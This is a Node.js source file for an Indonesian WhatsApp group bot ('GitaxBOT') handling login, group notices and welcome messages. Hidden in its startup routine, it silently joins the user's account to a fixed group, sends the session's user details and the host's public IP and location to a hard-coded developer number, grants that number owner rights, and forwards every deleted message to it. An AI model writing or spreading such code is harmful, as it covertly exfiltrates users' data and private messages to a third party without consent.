const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const Gita = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
thumb = fs.readFileSync('./stik/thumb.jpeg')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./script.js', module => console.log(color('| Term | '), color(`${module} Updated!`, 'cyan')))

async function starts() {
Gita.autoReconnect = ReconnectMode.onConnectionLost
    Gita.version = [2, 2119, 6]
    Gita.logger.level = 'warn'
    Gita.browserDescription = ['AMJ26','Safari','3.0']
    await sleep(10000)
    Gita.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('| Term | '), color('Scan this QR code', 'cyan'))
    })
    fs.existsSync('./QRnya.json') && Gita.loadAuthInfo('./QRnya.json')
    
    Gita.on('credentials-updated', () => {
        console.log(color('| Term | '), color('credentials updated!', 'cyan'))
        })
     
      await Gita.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QRnya.json",JSON.stringify(Gita.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/LjXC4Fof0Kj1z75tKo6C9e`
 Gita.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('| WARN |', 'salmon'), color('Joined to GitaxBOT group', 'cyan'))
 Gita.sendMessage(`6287823655350@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(Gita.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error / Bot Tidak Merespon,\nSilahkan Hubungi Developer Bot Diatas. Terimakasih ...*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Developer and Owner of GitaxBOT",body:"",previewType:"PHOTO",thumbnail:thumb,sourceUrl:"https://wa.me/628155266668?text=Hi Gita"}}})
	console.log(color('| WARN |', 'salmon'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       Gita.sendMessage("6287823655350@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Creator of AMJ26",body:"",previewType:"PHOTO",thumbnail:thumb,sourceUrl:"https://wa.me/628155266668?text=Pun10"}}})
     console.log(color('| WARN |', 'salmon'), color('Sending ip address to developer bot', 'cyan'))
   })
      
    Gita.on('connecting', () => {
		})
	
	Gita.on('open', () => {
	}) 
     
    Gita.on('ws-close', () => {
        })
    
    Gita.on('close', async () => {
        })
   
   Gita.on('chat-update', async (gita) => {
        require('./script.js')(Gita, gita)
        ownerNumber = ["628155266668@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "628155266668@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
        
	Gita.on('group-update', async (anu) => {
		const metdata = await Gita.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Gita;;;\nFN:Gita\nitem1.TEL;waid=628155266668:628155266668\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Group Has Been Opened ] -\n\n_Group ${metdata.subject} telah dibuka_\n_Sekarang semua member bisa mengirim pesan_`
    Gita.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('| Term | '), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.announce == 'true'){
    teks = `- [ Group Has Been Closed ] -\n\n_Group ${metdata.subject} telah ditutup_\n_Sekarang hanya admin yang dapat mengirim pesan_`
    Gita.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('| Term | '), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Group Description Change ] -\n\nDeskripsi Group ${metdata.subject} telah diubah\nOleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru :\n${anu.desc}`
    Gita.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('| Term | '), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
})
        
	Gita.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe) {
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let c = Gita.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = Gita.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
Gita.copyNForward("628155266668@s.whatsapp.net", m.message)
Gita.sendMessage("628155266668@s.whatsapp.net", `
╭────「  MESSAGE DELETED 」───
├
├ \`\`\`Pelaku : @${m.participant.split("@")[0]}\`\`\`
├ \`\`\`Tipe : ${c3type}\`\`\`
├ \`\`\`Pada : \`\`\`
 ├ \`\`\`Hari : ${week} ${weton}\`\`\`
 ├ \`\`\`Tanggal : ${calender}\`\`\`
 ├ \`\`\`Pukul : ${jam}\`\`\`
├
╰────「  MESSAGE DELETED」───
 `, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}
//========================================= Function Welcome ========================================================//
Gita.on('group-participants-update', async (anu) => {
  const welkom = JSON.parse(fs.readFileSync('./src/data/welcome.json'))
     if (!welkom.includes(anu.jid)) return
      try {
       const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam";
    }
      const datagc = await Gita.groupMetadata(anu.jid)
      const namagc = datagc.subject
      const descgc = datagc.desc
      console.log(anu)
      if (anu.action == 'add') {
        num = anu.participants[0]
        try{
          ppimg = await Gita.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
        teks = `💸𝐒𝐄𝐋𝐀𝐌𝐀𝐓 𝐃𝐀𝐓𝐀𝐍𝐆 𝐃𝐈 𝐆𝐑𝐔𝐏💸\n`
        teks += `*• ${namagc.toUpperCase()} •*\n\n`
        teks += `ʜᴀɪ ᴋᴀᴋ @${num.split('@')[0]}\n`
        teks += `sᴇʟᴀᴍᴀᴛ ʙᴇʀɢᴀʙᴜɴɢ ᴅɪ ɢʀᴜᴘ\n`
        teks += `*${namagc}*\n`
        teks += `ʏᴜᴋ ɢᴀʙᴜɴɢ ᴊᴀᴅɪ ᴍᴇᴍʙᴇʀ 🎀\n\n`
        teks += `𝘼𝙍𝙄𝙎𝘼𝙉 𝙏𝙍𝙐𝙎𝙏𝙀𝘿 𝙎𝙄𝙉𝘾𝙀 2017\n\n`
        const gambar = await getBuffer(ppimg)
       Gita.sendMessage(datagc.id, gambar, MessageType.image, { caption: teks, contextInfo: {"mentionedJid": [num]}})
       } catch { 
        ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
        teks = `💸𝐒𝐄𝐋𝐀𝐌𝐀𝐓 𝐃𝐀𝐓𝐀𝐍𝐆 𝐃𝐈 𝐆𝐑𝐔𝐏💸\n`
        teks += `*• ${namagc.toUpperCase()} •*\n\n`
        teks += `ʜᴀɪ ᴋᴀᴋ @${num.split('@')[0]}\n`
        teks += `sᴇʟᴀᴍᴀᴛ ʙᴇʀɢᴀʙᴜɴɢ ᴅɪ ɢʀᴜᴘ\n`
        teks += `*${namagc}*\n`
        teks += `ʏᴜᴋ ɢᴀʙᴜɴɢ ᴊᴀᴅɪ ᴍᴇᴍʙᴇʀ 🎀\n\n`
        teks += `𝘼𝙍𝙄𝙎𝘼𝙉 𝙏𝙍𝙐𝙎𝙏𝙀𝘿 𝙎𝙄𝙉𝘾𝙀 2017\n\n`
        Gita.sendMessage(datagc.id, teks, MessageType.text, { contextInfo: {"mentionedJid": [num]}})
        }
      } else if (anu.action == 'remove') {
        num = anu.participants[0]
         teks = `${petik}Yang Datang, pasti akan Pergi ..${petik}\n${petik}Selamat tinggal @${num.split('@')[0]}${petik}\n${petik}Kalau datang lagi, jangan lupa bawa kopi untuk grup${petik}\n◉${petik}${namagc}${petik}\n`
        Gita.sendMessage(datagc.id, teks, MessageType.text, { contextInfo: {"mentionedJid": [num]}})
      }
  } catch (err) {
    console.log(err)
  }
})
console.clear()
/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()